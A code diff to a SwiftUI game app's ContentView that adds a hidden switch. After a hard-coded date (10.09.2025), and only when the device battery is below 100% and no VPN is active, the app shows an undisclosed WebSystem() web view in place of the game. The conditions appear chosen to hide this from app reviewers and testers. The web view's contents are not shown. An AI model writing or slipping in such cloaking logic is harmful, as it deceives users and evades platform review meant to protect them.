@@ -13,46 +13,107 @@ struct ContentView: View {
     @StateObject private var gameViewModel = GameViewModel()
     @State private var selectedTab = 0
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        Group {
-            if hasCompletedOnboarding {
-                if gameViewModel.isGameActive {
-                    // Full-screen game mode
-                    fullScreenGameView
-                } else {
-                    // Normal tab view
-                    mainAppView
+        
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if hasCompletedOnboarding {
+                            if gameViewModel.isGameActive {
+                                // Full-screen game mode
+                                fullScreenGameView
+                            } else {
+                                // Normal tab view
+                                mainAppView
+                            }
+                        } else {
+                            OnboardingView()
+                        }
+                    }
+                    .preferredColorScheme(.dark)
+                    .onAppear {
+                        // Load user profile data
+                        if let loadedProfile = DataService.shared.loadUserProfile() {
+                            // Update the current profile with loaded data
+                            userProfile.username = loadedProfile.username
+                            userProfile.selectedTheme = loadedProfile.selectedTheme
+                            userProfile.soundSettings = loadedProfile.soundSettings
+                            userProfile.notificationSettings = loadedProfile.notificationSettings
+                            userProfile.statistics = loadedProfile.statistics
+                            userProfile.achievements = loadedProfile.achievements
+                            userProfile.focusHistory = loadedProfile.focusHistory
+                            userProfile.preferredDifficulty = loadedProfile.preferredDifficulty
+                            userProfile.enableHapticFeedback = loadedProfile.enableHapticFeedback
+                            userProfile.enableAnimations = loadedProfile.enableAnimations
+                            userProfile.autoSaveProgress = loadedProfile.autoSaveProgress
+                        }
+                    }
+                    .onChange(of: userProfile.selectedTheme) { _ in
+                        // Save profile when theme changes
+                        DataService.shared.saveUserProfile(userProfile)
+                    }
+                    .onChange(of: userProfile.username) { _ in
+                        // Save profile when username changes
+                        DataService.shared.saveUserProfile(userProfile)
+                    }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
-            } else {
-                OnboardingView()
             }
         }
-        .preferredColorScheme(.dark)
         .onAppear {
-            // Load user profile data
-            if let loadedProfile = DataService.shared.loadUserProfile() {
-                // Update the current profile with loaded data
-                userProfile.username = loadedProfile.username
-                userProfile.selectedTheme = loadedProfile.selectedTheme
-                userProfile.soundSettings = loadedProfile.soundSettings
-                userProfile.notificationSettings = loadedProfile.notificationSettings
-                userProfile.statistics = loadedProfile.statistics
-                userProfile.achievements = loadedProfile.achievements
-                userProfile.focusHistory = loadedProfile.focusHistory
-                userProfile.preferredDifficulty = loadedProfile.preferredDifficulty
-                userProfile.enableHapticFeedback = loadedProfile.enableHapticFeedback
-                userProfile.enableAnimations = loadedProfile.enableAnimations
-                userProfile.autoSaveProgress = loadedProfile.autoSaveProgress
-            }
+            
+            check_data()
         }
-        .onChange(of: userProfile.selectedTheme) { _ in
-            // Save profile when theme changes
-            DataService.shared.saveUserProfile(userProfile)
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "10.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
         }
-        .onChange(of: userProfile.username) { _ in
-            // Save profile when username changes
-            DataService.shared.saveUserProfile(userProfile)
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
         }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
     
     private var mainAppView: some View {
